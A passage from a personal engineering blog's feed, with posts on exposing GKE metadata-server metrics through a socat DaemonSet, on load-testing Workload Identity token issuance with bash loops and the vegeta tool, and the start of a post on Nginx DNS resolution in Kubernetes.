<p>&mdash; <a href="http://www.dest-unreach.org/socat/doc/socat.html#OPTION_FORK">http://www.dest-unreach.org/socat/doc/socat.html#OPTION_FORK</a></p>

<pre><code>cat proxy-daemonset.yaml

apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: gke-metadata-server-metrics-proxy
  namespace: monitoring
spec:
  selector:
    matchLabels:
      app: gke-metadata-server-metrics-proxy
  template:
    metadata:
      labels:
        app: gke-metadata-server-metrics-proxy
    spec:
      hostNetwork: true
      containers:
      - name: gke-metadata-server-metrics-proxy
        image: alpine/socat:1.7.3.4-r0@sha256:6786951b55e321e3968ba1c3786cb79b768f85d83d438f085336442b3bcef67a
        args: ["TCP-LISTEN:54899,reuseaddr,fork", "TCP:127.0.0.1:54898"]
        ports:
        - name: prom-metrics
          containerPort: 54899
          protocol: TCP
        livenessProbe:
          httpGet:
            host: 127.0.0.1
            path: /metricz
            port: 54899
            scheme: HTTP
        resources:
          limits:
            cpu: 100m
            memory: 100Mi
          requests:
            cpu: 100m
            memory: 100Mi
</code></pre>

<p>Apply the DaemonSet.</p>

<pre><code>kubectl --context [CONTEXT] apply -f proxy-daemonset.yaml
</code></pre>

<p>Now make an HTTP request to any GKE node IP at port 54899.</p>

<pre><code>kubectl --context [CONTEXT] -n monitoring get pods --selector app=gke-metadata-server-metrics-proxy -o wide

NAME                                      READY   STATUS    RESTARTS   AGE     IP              NODE                             NOMINATED NODE   READINESS GATES
gke-metadata-server-metrics-proxy-dvlpg   1/1     Running   0          4d19h   10.200.208.6    my-cluster-n1-s-32-dfabe6b6-38px   &lt;none&gt;           &lt;none&gt;
gke-metadata-server-metrics-proxy-dx4lq   1/1     Running   0          4d19h   10.200.208.8    my-cluster-n1-s-32-dfabe6b6-mnlg   &lt;none&gt;           &lt;none&gt;
gke-metadata-server-metrics-proxy-j9p49   1/1     Running   0          4d19h   10.200.208.7    my-cluster-n1-s-32-dfabe6b6-vv9s   &lt;none&gt;           &lt;none&gt;
gke-metadata-server-metrics-proxy-jvvjw   1/1     Running   0          4d19h   10.200.208.12   my-cluster-n1-s-32-192fa3d9-wb2c   &lt;none&gt;           &lt;none&gt;
gke-metadata-server-metrics-proxy-k5sqd   1/1     Running   0          4d19h   10.200.208.10   my-cluster-n1-s-32-55dd75ff-6l40   &lt;none&gt;           &lt;none&gt;
gke-metadata-server-metrics-proxy-tdhkn   1/1     Running   0          4d19h   10.200.208.9    my-cluster-n1-s-32-55dd75ff-jqgk   &lt;none&gt;           &lt;none&gt;

http GET '10.200.208.6:54899/metricz' | head -n 20

# HELP go_gc_duration_seconds A summary of the GC invocation durations.
# TYPE go_gc_duration_seconds summary
go_gc_duration_seconds{quantile="0"} 2.8295e-05
go_gc_duration_seconds{quantile="0.25"} 3.6269e-05
go_gc_duration_seconds{quantile="0.5"} 5.2122e-05
go_gc_duration_seconds{quantile="0.75"} 7.585e-05
go_gc_duration_seconds{quantile="1"} 0.099987877
go_gc_duration_seconds_sum 7.738486774
go_gc_duration_seconds_count 6809
# HELP go_goroutines Number of goroutines that currently exist.
# TYPE go_goroutines gauge
go_goroutines 47
# HELP go_info Information about the Go environment.
# TYPE go_info gauge
go_info{version="go1.14rc1"} 1
# HELP go_memstats_alloc_bytes Number of bytes allocated and still in use.
# TYPE go_memstats_alloc_bytes gauge
go_memstats_alloc_bytes 2.4743056e+07
# HELP go_memstats_alloc_bytes_total Total number of bytes allocated, even if freed.
# TYPE go_memstats_alloc_bytes_total counter
</code></pre>

<p>Voila. The important metrics are:</p>

<ul>
<li><code>metadata_server_request_count</code></li>
<li><code>metadata_server_request_durations_bucket</code></li>
</ul>


<p>I have these <a href="https://prometheus.io/docs/prometheus/latest/configuration/recording_rules/#recording-rules">Prometheus recording rules</a> to calculate RPS and request
duration percentiles.</p>

<pre><code>groups:
- name: gke-metadata-server
  rules:
  # Compute a 5-minute rate for the counter `metadata_server_request_count`.
  - record: metadata_server_request_count:rate5m
    expr: rate(metadata_server_request_count[5m])
  # Compute latency percentiles for the histogram metric
  # `metadata_server_request_durations_bucket` over 5-minute increments for each label
  # combination.
  - record: metadata_server_request_duration:p99
    expr: histogram_quantile(0.99, rate(metadata_server_request_durations_bucket[5m]))
  - record: metadata_server_request_duration:p95
    expr: histogram_quantile(0.95, rate(metadata_server_request_durations_bucket[5m]))
  - record: metadata_server_request_duration:p90
    expr: histogram_quantile(0.90, rate(metadata_server_request_durations_bucket[5m]))
  - record: metadata_server_request_duration:p50
    expr: histogram_quantile(0.50, rate(metadata_server_request_durations_bucket[5m]))
  - record: metadata_server_request_duration:mean
    expr: rate(metadata_server_request_durations_sum[5m]) / rate(metadata_server_request_durations_count[5m])
  # Compute latency percentiles for the histogram metric
  # `metadata_server_request_durations_bucket` over 5-minute increments and aggregate all
  # labels. We must aggregate here instead of in Grafana because averaging percentiles doesn’t
  # work. To compute a percentile, you need the original population of events. The math is just
  # broken. An average of a percentile is meaningless.
  - record: metadata_server_all_request_duration:p99
    expr: histogram_quantile(0.99, sum(rate(metadata_server_request_durations_bucket[5m])) by (le))
  - record: metadata_server_all_request_duration:p95
    expr: histogram_quantile(0.95, sum(rate(metadata_server_request_durations_bucket[5m])) by (le))
  - record: metadata_server_all_request_duration:p90
    expr: histogram_quantile(0.90, sum(rate(metadata_server_request_durations_bucket[5m])) by (le))
  - record: metadata_server_all_request_duration:p50
    expr: histogram_quantile(0.50, sum(rate(metadata_server_request_durations_bucket[5m])) by (le))
  - record: metadata_server_all_request_duration:mean
    expr: rate(metadata_server_request_durations_sum[5m]) / rate(metadata_server_request_durations_count[5m])
  # Compute latency percentiles for the histogram metric `outgoing_request_latency_bucket` over
  # 5-minute increments for each label combination.
  - record: outgoing_request_latency:p99
    expr: histogram_quantile(0.99, rate(outgoing_request_latency_bucket[5m]))
  - record: outgoing_request_latency:p95
    expr: histogram_quantile(0.95, rate(outgoing_request_latency_bucket[5m]))
  - record: outgoing_request_latency:p90
    expr: histogram_quantile(0.90, rate(outgoing_request_latency_bucket[5m]))
  - record: outgoing_request_latency:p50
    expr: histogram_quantile(0.50, rate(outgoing_request_latency_bucket[5m]))
  - record: outgoing_request_latency:mean
    expr: rate(outgoing_request_latency_sum[5m]) / rate(outgoing_request_latency_count[5m])
  # Compute latency percentiles for the histogram metric `outgoing_request_latency_bucket` over
  # 5-minute increments and aggregate all labels. We must aggregate here instead of in Grafana
  # because averaging percentiles doesn’t work. To compute a percentile, you need the original
  # population of events. The math is just broken. An average of a percentile is meaningless.
  - record: outgoing_all_request_latency:p99
    expr: histogram_quantile(0.99, sum(rate(outgoing_request_latency_bucket[5m])) by (le))
  - record: outgoing_all_request_latency:p95
    expr: histogram_quantile(0.95, sum(rate(outgoing_request_latency_bucket[5m])) by (le))
  - record: outgoing_all_request_latency:p90
    expr: histogram_quantile(0.90, sum(rate(outgoing_request_latency_bucket[5m])) by (le))
  - record: outgoing_all_request_latency:p50
    expr: histogram_quantile(0.50, sum(rate(outgoing_request_latency_bucket[5m])) by (le))
  - record: outgoing_all_request_latency:mean
    expr: rate(outgoing_request_latency_sum[5m]) / rate(outgoing_request_latency_count[5m])
</code></pre>

<p>Thanks to <a href="https://twitter.com/mikedanese">@mikedanese</a> for the intial idea of using <code>socat</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[3 Levels of Load Testing GKE Workload Identity]]></title>
    <link href="https://www.davidxia.com/2020/04/3-levels-of-load-testing-gke-workload-identity/"/>
    <updated>2020-04-01T10:21:11-04:00</updated>
    <id>https://www.davidxia.com/2020/04/3-levels-of-load-testing-gke-workload-identity</id>
    <content type="html"><![CDATA[<p>I manage multitenant <a href="https://cloud.google.com/kubernetes-engine">Google Kubernetes Engine</a> (GKE) clusters for stateless backend services at
work. Google recently graduated GKE&rsquo;s <a href="https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity">Workload Identity</a> (WI) feature to generally available
(GA). When my team used WI during its beta stage, it seemed to fail when there were more than 16
requests per second (RPS) on one GKE node to retrieve Google access tokens.</p>

<p>Before we knew about this low RPS failure threshold, we told many internal engineering teams
to go ahead and use the feature. In hindsight, we should&rsquo;ve load-tested the feature before making it
generally available internally especially since it wasn&rsquo;t even GA publicly.</p>

<p>My efforts to load test WI have grown more sophisticated over time. This post describes the
progression. It&rsquo;s like the &ldquo;4 Levels of &hellip;&rdquo; <a href="https://www.youtube.com/playlist?list=PLz3-p2q6vFYUDvVUu_aPhGUV-3ROIa6d2">Epicurious Youtube videos</a>. The goal here is to find
out at what RPS WI starts to fail and to try to learn some generalizable lessons from load testing
vendor-managed services.</p>

<h3>tl;dr lessons learned</h3>

<ul>
<li>always load test new features above and beyond what you expect your production load will be</li>
<li>use proper load testing tools and not bash for loops</li>
</ul>


<!-- more -->


<h2>My specific GKE cluster configuration</h2>

<ul>
<li>GKE masters and nodes running version 1.15.9-gke.22</li>
<li>regional cluster in Google Cloud Platform (GCP) (not on-premise)</li>
<li>4 GKE nodes that are n1-standard-32 GCE instances in one node pool</li>
<li>each node is configured to have a maximum of 32 Pods</li>
<li>cluster and node pool have WI enabled</li>
</ul>


<h2>High level of what Workload Identity is and how it works</h2>

<p>Workloads on GKE often need to access GCP resources like PubSub or CloudSQL.
In order to do so, your workload needs to use a Google Service Account (GSA) key that is authorized to
access those resources. So you end up creating keys for all your GSA&rsquo;s and copy-pasting
these keys into Kubernetes Secrets for your workloads. This is insecure and not maintainable if you
are a company that has dozens of engineering teams and hundreds of workloads.</p>

<p>So GCP offered WI which allows a Kubernetes Service Account (KSA) to be associated with a GSA. If a
workload can run with a certain KSA, it&rsquo;ll transparently get the Google access token for the
associated GSA. No manual copy-pasting GSA keys!</p>

<p>How does this work? You have to enable WI on your cluster and node pool. This creates a
<code>gke-metadata-server</code> DaemonSet in the <code>kube-system</code> namespace. <code>gke-metadata-server</code> is the
entrypoint to the whole WI system. Here&rsquo;s a nice <a href="https://www.youtube.com/watch?v=s4NYEJDFc0M">Google Cloud Next conference talk</a> with more
details.</p>

<p><code>gke-metadata-server</code> is the only part of WI that is exposed to GKE users, i.e. runs on machines you
control. It&rsquo;s like the Verizon FiOS box in your basement. You control your house, but there&rsquo;s a
little box that Verizon owns and operates in there. All other parts of WI run on GCP infrastructure
that you can&rsquo;t see. When I saw failures with WI, it all seemed to happen in
<code>gke-metadata-server</code>. So that&rsquo;s what I&rsquo;ll load test.</p>

<p>Here&rsquo;s the <code>gke-metadata-server</code> DaemonSet YAML for reference. As of the time of this writing the
image is <code>gke.gcr.io/gke-metadata-server:20200218_1145_RC0</code>. You might see different behavior with
different images.</p>

<pre><code>apiVersion: extensions/v1beta1
kind: DaemonSet
metadata:
  creationTimestamp: "2019-10-15T17:04:40Z"
  generation: 8
  labels:
    addonmanager.kubernetes.io/mode: Reconcile
    k8s-app: gke-metadata-server
  name: gke-metadata-server
  namespace: kube-system
  resourceVersion: "138588210"
  selfLink: /apis/extensions/v1beta1/namespaces/kube-system/daemonsets/gke-metadata-server
  uid: e06885d8-ef6d-11e9-88c9-42010a8c0110
spec:
  revisionHistoryLimit: 10
  selector:
    matchLabels:
      k8s-app: gke-metadata-server
  template:
    metadata:
      annotations:
        components.gke.io/component-name: gke-metadata-server
        components.gke.io/component-version: 0.2.21
        scheduler.alpha.kubernetes.io/critical-pod: '"''"'
      creationTimestamp: null
      labels:
        addonmanager.kubernetes.io/mode: Reconcile
        k8s-app: gke-metadata-server
    spec:
      containers:
      - command:
        - /gke-metadata-server
        - --logtostderr
        - --token-exchange-endpoint=https://securetoken.googleapis.com/v1/identitybindingtoken
        - --identity-namespace=[redacted].svc.id.goog
        - --identity-provider-id=https://container.googleapis.com/v1/projects/[redacted]/locations/asia-east1/clusters/[redacted]
        - --passthrough-ksa-list=kube-system:container-watcher-pod-reader,kube-system:event-exporter-sa,kube-system:fluentd-gcp-scaler,kube-system:heapster,kube-system:kube-dns,kube-system:metadata-agent,kube-system:network-metering-agent,kube-system:securityprofile-controller,istio-system:istio-ingressgateway-service-account,istio-system:cluster-local-gateway-service-account,csm:csm-sync-agent,knative-serving:controller
        - --attributes=cluster-name=[redacted],cluster-uid=[redacted],cluster-location=asia-east1
        - --enable-identity-endpoint=true
        - --cluster-uid=[redacted]
        image: gke.gcr.io/gke-metadata-server:20200218_1145_RC0
        imagePullPolicy: IfNotPresent
        livenessProbe:
          failureThreshold: 3
          httpGet:
            host: 127.0.0.1
            path: /healthz
            port: 54898
            scheme: HTTP
          initialDelaySeconds: 10
          periodSeconds: 10
          successThreshold: 1
          timeoutSeconds: 1
        name: gke-metadata-server
        resources:
          limits:
            cpu: 100m
            memory: 100Mi
          requests:
            cpu: 100m
            memory: 100Mi
        securityContext:
          privileged: true
        terminationMessagePath: /dev/termination-log
        terminationMessagePolicy: File
        volumeMounts:
        - mountPath: /var/lib/kubelet/kubeconfig
          name: kubelet-credentials
          readOnly: true
        - mountPath: /var/lib/kubelet/pki/
          name: kubelet-certs
          readOnly: true
        - mountPath: /var/run/
          name: container-runtime-interface
        - mountPath: /etc/srv/kubernetes/pki
          name: kubelet-pki
          readOnly: true
        - mountPath: /etc/ssl/certs/
          name: ca-certificates
          readOnly: true
      dnsPolicy: Default
      hostNetwork: true
      nodeSelector:
        beta.kubernetes.io/os: linux
        iam.gke.io/gke-metadata-server-enabled: "true"
      priorityClassName: system-node-critical
      restartPolicy: Always
      schedulerName: default-scheduler
      securityContext: {}
      serviceAccount: gke-metadata-server
      serviceAccountName: gke-metadata-server
      terminationGracePeriodSeconds: 30
      tolerations:
      - effect: NoExecute
        operator: Exists
      - effect: NoSchedule
        operator: Exists
      volumes:
      - hostPath:
          path: /var/lib/kubelet/pki/
          type: Directory
        name: kubelet-certs
      - hostPath:
          path: /var/lib/kubelet/kubeconfig
          type: File
        name: kubelet-credentials
      - hostPath:
          path: /var/run/
          type: Directory
        name: container-runtime-interface
      - hostPath:
          path: /etc/srv/kubernetes/pki/
          type: Directory
        name: kubelet-pki
      - hostPath:
          path: /etc/ssl/certs/
          type: Directory
        name: ca-certificates
  templateGeneration: 8
  updateStrategy:
    rollingUpdate:
      maxUnavailable: 1
    type: RollingUpdate
</code></pre>

<h2>Level 1</h2>

<p>What kind of load am I putting on <code>gke-metadata-server</code>? Since this DaemonSet exists to give out
Google access tokens, I&rsquo;ll send it HTTP requests asking for such tokens.</p>

<p>I built a Docker image with the following <code>Dockerfile</code>.</p>

<pre><code>FROM google/cloud-sdk
ENTRYPOINT while true; do for i in {1..20}; do curl -X GET https://www.googleapis.com/oauth2/v3/tokeninfo?access_token=$(gcloud auth print-access-token) &amp; done; wait; done;
</code></pre>

<p>Then I created the following K8s Deployment YAML.</p>

<pre><code class="yaml">apiVersion: apps/v1
kind: Deployment
metadata:
  name: wi-test
  namespace: [K8S_NAMESPACE]
spec:
  replicas: 7
  selector:
    matchLabels:
      app: wi-test
  template:
    metadata:
      labels:
        app: wi-test
    spec:
      nodeSelector:
        kubernetes.io/hostname: [NODE-NAME]
      containers:
      - image: my-docker-image
        name: workload-identity-test
</code></pre>

<p>I ran seven of these Pods on a single node (see the <code>nodeSelector</code> above) to target a single
instance of <code>gke-metadata-server</code>.</p>

<p>This isn&rsquo;t a great test because there&rsquo;s a lot of extra work performed by the Container in running
<code>gcloud</code> to print a Google access token (there may be bottlenecks in this <code>gcloud</code> command itself
which is Python code), curling the <code>googleapis.com</code> endpoint to get the token info (originally done
to verify the token was valid). And there&rsquo;s probably bottlenecks in using a shell to do this. All in
all, this implementation doesn&rsquo;t really let you specify a fixed RPS. You&rsquo;re at the mercy of how fast
your Container, shell, gcloud, and the network will let you execute this. I also wasn&rsquo;t able to run
more Pods on a single node because I was hitting the max 32 pods per node limit. There were already
a bunch of other GKE-system level workloads like Calico that took up node capacity.</p>

<h2>Level 2</h2>

<p>Apply this one Pod</p>

<pre><code>cat &lt;&lt;EOF | kubectl --context [CONTEXT] apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: wi-test
  namespace: [K8S_NAMESPACE]
spec:
  containers:
  - image: google/cloud-sdk
    name: wi-test
    command: [ '/bin/bash', '-c', '--' ]
    args: [ 'while true; do sleep 30; done;' ]
    securityContext:
      allowPrivilegeEscalation: false
      privileged: false
      readOnlyRootFilesystem: false
    resources:
      limits:
        cpu: 2
        memory: 4G
      requests:
        cpu: 2
        memory: 4G
EOF
</code></pre>

<p>Then <code>kubectl exec</code> in and run this command.</p>

<pre><code>for i in {1..N}; do gcloud auth print-access-token &amp; done; wait;
</code></pre>

<p>Everything seemed to work fine when N was 100. When N was 200 I got a few errors like the below.
They look like client-side errors and not server ones though.</p>

<pre><code>ERROR: gcloud failed to load: No module named 'ruamel.yaml.error'
gcloud_main = _import_gcloud_main()
import googlecloudsdk.gcloud_main
from googlecloudsdk.api_lib.iamcredentials import util as iamcred_util
from googlecloudsdk.api_lib.util import exceptions
from googlecloudsdk.core.resource import resource_printer
from googlecloudsdk.core.resource import yaml_printer
from googlecloudsdk.core.yaml import dict_like
from googlecloudsdk.core import yaml_location_value
from ruamel import yaml
from ruamel.yaml.main import * # NOQA
from ruamel.yaml.error import UnsafeLoaderWarning, YAMLError # NOQA

This usually indicates corruption in your gcloud installation or problems with your Python interpreter.

Please verify that the following is the path to a working Python 2.7 or 3.5+ executable:
/usr/bin/python3

If it is not, please set the CLOUDSDK_PYTHON environment variable to point to a working Python 2.7 or 3.5+ executable.

If you are still experiencing problems, please reinstall the Cloud SDK using the instructions here:
https://cloud.google.com/sdk/

ERROR: gcloud failed to load: cannot import name 'opentype' from 'pyasn1.type' (/usr/bin/../lib/google-cloud-sdk/lib/third_party/pyasn1/type/__init__.py)
from google.auth.crypt import _cryptography_rsa
import cryptography.exceptions


File "/usr/bin/../lib/google-cloud-sdk/lib/gcloud.py", line 67, in main
File "/usr/bin/../lib/google-cloud-sdk/lib/gcloud.py", line 48, in _import_gcloud_main
File "/usr/lib/google-cloud-sdk/lib/googlecloudsdk/gcloud_main.py", line 33, in &lt;module&gt;
File "/usr/lib/google-cloud-sdk/lib/googlecloudsdk/api_lib
</code></pre>

<p><code>gcloud</code> does not synchronize between processes with concurrent invokations. It sometimes writes
files to disk. So this is also not a great load test because it still doesn&rsquo;t let you achieve a
specific RPS and has client-side bottlenecks.</p>

<h2>Level 3</h2>

<p>Use a proper HTTP load testing tool. A colleague told me about <a href="https://github.com/tsenart/vegeta"><code>vegeta</code></a>.
It&rsquo;s a seemingly good tool, but, more importantly, its commands are amazing.
<code>vegeta attack ...</code>.</p>

<p>I first start a <code>golang</code> Pod that just busy-waits.</p>

<pre><code>$ cat &lt;&lt;EOF | kubectl --context [CONTEXT] apply -f -
&gt; apiVersion: v1
&gt; kind: Pod
&gt; metadata:
&gt;   name: wi-test
&gt;   namespace: [NAMESPACE]
&gt; spec:
&gt;   containers:
&gt;   - image: golang:latest
&gt;     name: wi-test
&gt;     command: [ '/bin/bash', '-c', '--' ]
&gt;     args: [ 'while true; do sleep 30; done;' ]
&gt;     resources:
&gt;       limits:
&gt;         cpu: 2
&gt;         memory: 4G
&gt;       requests:
&gt;         cpu: 2
&gt;         memory: 4G
&gt; EOF

pod/wi-test created
</code></pre>

<p>Then I get a shell in it.</p>

<pre><code>kubectl --context [CONTEXT] -n [NAMESPACE] exec -it wi-test bash

Defaulting container name to wi-test.
Use 'kubectl describe pod/wi-test -n [NAMESPACE]' to see all of the containers in this pod.

root@wi-test:/go# go get github.com/tsenart/vegeta
root@wi-test:/go# vegeta -version

Version:
Commit:
Runtime: go1.14.1 linux/amd64
Date:
</code></pre>

<p>Let&rsquo;s throw some load on WI! <code>my-gsa@my-project.iam.gserviceaccount.com</code> is the GSA associated with
the KSA your workload runs as.</p>

<pre><code>root@wi-test:/go# echo "GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token" | vegeta attack -header 'Metadata-Flavor: Google' -rate 10 -duration=5s | vegeta report

Requests      [total, rate, throughput]         50, 10.20, 10.20
Duration      [total, attack, wait]             4.904s, 4.9s, 4.168ms
Latencies     [min, mean, 50, 90, 95, 99, max]  4.168ms, 6.137ms, 5.039ms, 9.591ms, 10.444ms, 31.452ms, 31.452ms
Bytes In      [total, mean]                     25300, 506.00
Bytes Out     [total, mean]                     0, 0.00
Success       [ratio]                           100.00%
Status Codes  [code:count]                      200:50
Error Set:

root@wi-test:/go# echo "GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token" | vegeta attack -header 'Metadata-Flavor: Google' -rate 1000 -duration=5s | vegeta report
Requests      [total, rate, throughput]         5000, 1000.20, 127.51
Duration      [total, attack, wait]             31.175s, 4.999s, 26.176s
Latencies     [min, mean, 50, 90, 95, 99, max]  101.972ms, 11.003s, 7.652s, 30s, 30s, 30s, 30.001s
Bytes In      [total, mean]                     2011350, 402.27
Bytes Out     [total, mean]                     0, 0.00
Success       [ratio]                           79.50%
Status Codes  [code:count]                      0:1025  200:3975
Error Set:
Get "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token": context deadline exceeded (Client.Timeout exceeded while awaiting headers)

root@wi-test:/go# echo "GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token" | vegeta attack -header 'Metadata-Flavor: Google' -rate 100 -duration=5s | vegeta report
Requests      [total, rate, throughput]         500, 100.20, 98.40
Duration      [total, attack, wait]             5.081s, 4.99s, 91.244ms
Latencies     [min, mean, 50, 90, 95, 99, max]  3.805ms, 106.449ms, 59.058ms, 306.334ms, 372.519ms, 506.703ms, 601.534ms
Bytes In      [total, mean]                     253000, 506.00
Bytes Out     [total, mean]                     0, 0.00
Success       [ratio]                           100.00%
Status Codes  [code:count]                      200:500
Error Set:

root@wi-test:/go# echo "GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token" | vegeta attack -header 'Metadata-Flavor: Google' -rate 500 -duration=5s | vegeta report
Requests      [total, rate, throughput]         2500, 500.20, 43.29
Duration      [total, attack, wait]             34.072s, 4.998s, 29.074s
Latencies     [min, mean, 50, 90, 95, 99, max]  10.56ms, 12.579s, 756.03ms, 30s, 30s, 30s, 30.001s
Bytes In      [total, mean]                     746350, 298.54
Bytes Out     [total, mean]                     0, 0.00
Success       [ratio]                           59.00%
Status Codes  [code:count]                      0:1025  200:1475
Error Set:
Get "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token": context deadline exceeded (Client.Timeout exceeded while awaiting headers)

root@wi-test:/go# echo "GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token" | vegeta attack -header 'Metadata-Flavor: Google' -rate 250 -duration=5s | vegeta report
Requests      [total, rate, throughput]         1250, 250.22, 28.52
Duration      [total, attack, wait]             34.996s, 4.996s, 30s
Latencies     [min, mean, 50, 90, 95, 99, max]  8.331ms, 6.347s, 376.419ms, 30s, 30s, 30s, 30.001s
Bytes In      [total, mean]                     504988, 403.99
Bytes Out     [total, mean]                     0, 0.00
Success       [ratio]                           79.84%
Status Codes  [code:count]                      0:252  200:998
Error Set:
Get "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token": context deadline exceeded (Client.Timeout exceeded while awaiting headers)

root@wi-test:/go# echo "GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token" | vegeta attack -header 'Metadata-Flavor: Google' -rate 200 -duration=5s | vegeta report
Requests      [total, rate, throughput]         1000, 200.20, 28.28
Duration      [total, attack, wait]             32.43s, 4.995s, 27.435s
Latencies     [min, mean, 50, 90, 95, 99, max]  9.985ms, 2.739s, 188.509ms, 797.058ms, 30s, 30s, 30s
Bytes In      [total, mean]                     464002, 464.00
Bytes Out     [total, mean]                     0, 0.00
Success       [ratio]                           91.70%
Status Codes  [code:count]                      0:83  200:917
Error Set:
Get "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token": context deadline exceeded (Client.Timeout exceeded while awaiting headers)

root@wi-test:/go# echo "GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token" | vegeta attack -header 'Metadata-Flavor: Google' -rate 150 -duration=5s | vegeta report
Requests      [total, rate, throughput]         750, 150.20, 146.53
Duration      [total, attack, wait]             5.118s, 4.993s, 125.078ms
Latencies     [min, mean, 50, 90, 95, 99, max]  3.747ms, 224.285ms, 171.325ms, 460.236ms, 549.18ms, 682.161ms, 892.25ms
Bytes In      [total, mean]                     379500, 506.00
Bytes Out     [total, mean]                     0, 0.00
Success       [ratio]                           100.00%
Status Codes  [code:count]                      200:750
Error Set:

root@wi-test:/go# echo "GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token" | vegeta attack -header 'Metadata-Flavor: Google' -rate 175 -duration=5s | vegeta report
Requests      [total, rate, throughput]         875, 175.20, 24.46
Duration      [total, attack, wait]             34.097s, 4.994s, 29.103s
Latencies     [min, mean, 50, 90, 95, 99, max]  3.704ms, 1.687s, 231.652ms, 708.672ms, 2.432s, 30s, 30s
Bytes In      [total, mean]                     422004, 482.29
Bytes Out     [total, mean]                     0, 0.00
Success       [ratio]                           95.31%
Status Codes  [code:count]                      0:41  200:834
Error Set:
Get "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token": context deadline exceeded (Client.Timeout exceeded while awaiting headers)

root@wi-test:/go# echo "GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token" | vegeta attack -header 'Metadata-Flavor: Google' -rate 165 -duration=5s | vegeta report
Requests      [total, rate, throughput]         825, 165.20, 23.61
Duration      [total, attack, wait]             34.6s, 4.994s, 29.606s
Latencies     [min, mean, 50, 90, 95, 99, max]  3.483ms, 558.613ms, 222.111ms, 531.49ms, 622.473ms, 11.851s, 30s
Bytes In      [total, mean]                     413402, 501.09
Bytes Out     [total, mean]                     0, 0.00
Success       [ratio]                           99.03%
Status Codes  [code:count]                      0:8  200:817
Error Set:
Get "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
</code></pre>

<p>After more bisection, I found that this specific instance of <code>gke-metadata-server</code>
starts to fail around 150RPS. When it does fail, p99 latency skyrockets from less than 1 second to
30 seconds. This is usually a sign of a rate limiter or quota.</p>

<p>How have you tried load testing WI or other GKE features? What&rsquo;re your favorite load testing tools
for these cases, and what interesting behavior have you found?</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[More About Nginx DNS Resolution Than You Ever Wanted to Know]]></title>
    <link href="https://www.davidxia.com/2019/05/more-about-nginx-dns-resolution-than-you-ever-wanted-to-know/"/>
    <updated>2019-05-17T12:58:38-04:00</updated>
    <id>https://www.davidxia.com/2019/05/more-about-nginx-dns-resolution-than-you-ever-wanted-to-know</id>
    <content type="html"><![CDATA[<p>This is a post about Nginx&rsquo;s DNS resolution behavior I didn&rsquo;t know about but wish I did before I
started using Kubernetes (K8s).</p>

<h2>Nginx caches statically configured domains once</h2>

<h3>Symptoms</h3>

<p>I moved a backend service <code>foo</code> from running on a virtual machine to K8s. Foo&rsquo;s clients include an
Nginx instance running outside K8s configured with this <code>upstream</code> block.</p>

<pre><code>upstream foo {
  server foo.example.com.;
}

server {
  ...

  location ~* /_foo/(.*) {
    proxy_pass https://foo/$1;
    ...
  }
}
</code></pre>

<p>K8s Pods can be rescheduled anytime so their IPs aren&rsquo;t stable. I&rsquo;m supposed to use K8s Services
to avoid caching these ephemeral Pod IPs. But in my case because of interoperability reasons I was
registering Pod IPs directly as A records for <code>foo.example.com.</code>. I started noticing that after my Pod
IPs changed either because of rescheduling or updating the Deployment, Nginx started throwing
<code>502 Bad Gateway</code> errors.</p>

<h3>Root Problem</h3>

<p>Nginx resolves statically configured domain names only once at startup or configuration
reload time. So Nginx resolved <code>foo.example.com.</code> once at startup to several Pod IPs and cached
them forever.</p>

<h3>Solution</h3>

<!-- more -->


<p>Using a variable for the domain name will make Nginx resolve and cache it using the TTL value of the
DNS response. So replace the <code>upstream</code> block with a variable. I have no idea why it has to be a
variable to make Nginx resolve the domain periodically.</p>

<pre><code>set $foo_url foo.example.com.;
</code></pre>

<p>And replace the <code>proxy_pass</code> line with</p>

<pre><code>  location ~* /_foo/(.*) {
    proxy_pass https://$foo_url/$1;
    ...
  }
</code></pre>

<p>This behavior isn&rsquo;t documented but has been observed empirically and discussed <a href="https://serverfault.com/a/593003/88755">here</a>, <a href="https://stackoverflow.com/a/41476524/553994">here</a>,
and <a href="https://www.ruby-forum.com/t/using-127-0-0-1-in-resolver/238180/4">here</a>. I also learned that this setup requires me to define a <code>resolver</code> in the Nginx configs.
<strong>For some reason Nginx resolves statically configured domains by querying the nameserver specified in
<code>/etc/resolv.conf</code> but periodically resolved domains require a completely different config
setting.</strong> I would love to know why.</p>

<p>The VM on which Nginx was running ran a Bind DNS server locally, so I set <code>resolver 127.0.0.1</code>.
I triggered the code path that made Nginx send requests to foo and saw periodic DNS queries
occurring with <code>sudo tcpdump -i lo -n dst port 53 | grep foo</code>.</p>

<h2>What if that Nginx is also running on K8s?</h2>

<h3>Problem</h3>

<p>I had another Nginx instance that also made requests to foo. This Nginx was running on K8s too. It
was created with this Deployment YAML.</p>

<pre><code class="yaml">apiVersion: apps/v1
